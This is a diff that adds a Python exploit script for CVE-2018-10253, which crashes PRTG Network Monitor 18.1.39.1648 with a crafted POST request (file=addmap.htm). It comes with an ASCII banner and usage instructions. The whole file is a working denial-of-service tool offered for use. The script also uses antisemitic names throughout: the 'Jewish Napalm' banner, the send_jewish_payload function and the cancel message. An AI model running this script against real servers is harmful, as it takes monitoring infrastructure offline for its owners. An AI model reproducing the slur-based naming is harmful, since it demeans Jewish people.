@@ -1,0 +1,80 @@
+# Exploit Title: PRTG 18.1.39.1648 - Stack Overflow
+# Date: 2018-04-21
+# Exploit Author: Lucas "luriel" Carmo
+# Vendor Homepage: https://www.paessler.com/prtg
+# Software Link: https://www.paessler.com/download/prtg-download
+# Version: 18.1.39.1648
+# CVE : CVE-2018-10253
+# Post Reference: https://medium.com/stolabs/stack-overflow-jewish-napalm-on-prtg-network-monitoring-56609b0804c5
+# http://www.roothc.com.br/stack-overflow-prtg-network-monitoring-jewish-napalm/
+
+#!/usr/bin/python
+
+import requests
+import sys
+import os
+import re
+import socket
+
+green = "\033[1;32m"
+yellow = '\033[1;33m'
+normal = '\033[0;0m'
+banner = """
+     ██╗███████╗██╗    ██╗██╗███████╗██╗  ██╗    ███╗   ██╗ █████╗ ██████╗  █████╗ ██╗     ███╗   ███╗
+     ██║██╔════╝██║    ██║██║██╔════╝██║  ██║    ████╗  ██║██╔══██╗██╔══██╗██╔══██╗██║     ████╗ ████║
+     ██║█████╗  ██║ █╗ ██║██║███████╗███████║    ██╔██╗ ██║███████║██████╔╝███████║██║     ██╔████╔██║
+██   ██║██╔══╝  ██║███╗██║██║╚════██║██╔══██║    ██║╚██╗██║██╔══██║██╔═══╝ ██╔══██║██║     ██║╚██╔╝██║
+╚█████╔╝███████╗╚███╔███╔╝██║███████║██║  ██║    ██║ ╚████║██║  ██║██║     ██║  ██║███████╗██║ ╚═╝ ██║
+ ╚════╝ ╚══════╝ ╚══╝╚══╝ ╚═╝╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚══════╝╚═╝     ╚═╝
+"""
+
+
+banner2 = """
+                                            Author: @Lucas "luriel" Carmo
+"""
+
+os.system('clear')
+
+print(green+banner)
+print(yellow+banner2)
+print(normal)
+
+def check_http(url):
+    pattern = re.compile("http://")
+    return re.search(pattern, url)
+
+def sanitize_url(url):
+    if(not check_http(url)):
+        return "http://" + url
+    return url
+
+def check_server(url):
+    r = requests.get(url, timeout=4)
+    code = r.status_code
+
+def send_jewish_payload(url):
+    payload = {'file':'addmap.htm'}
+    r = requests.post(url, params=payload)
+
+def main():
+    try:
+        if len(sys.argv) <= 3 and len (sys.argv) >= 2:
+            try:
+                url = sanitize_url(sys.argv[1])
+                print(' [#] LOADING!')
+                if (check_server(url) != 404):
+                    send_jewish_payload(url)
+                else:
+                    print(' [!] Server shutdown or not found')
+            except requests.exceptions.ConnectionError:
+                print(' [~] BOOOOOM! PRTG Server has been exploded!')
+            except requests.exceptions.InvalidURL:
+                print(' [!] Invalid URL')
+            except requests.exceptions.Timeout:
+                print(' [!] Connection Timeout\n')
+        else:
+            print('Example usage: ./'+sys.argv[0]+' http://192.168.0.10/index.htm')
+    except KeyboardInterrupt:
+        print(' [!] Jewish Napalm Canceled;.....[./]')
+if __name__ == '__main__':
+    main()
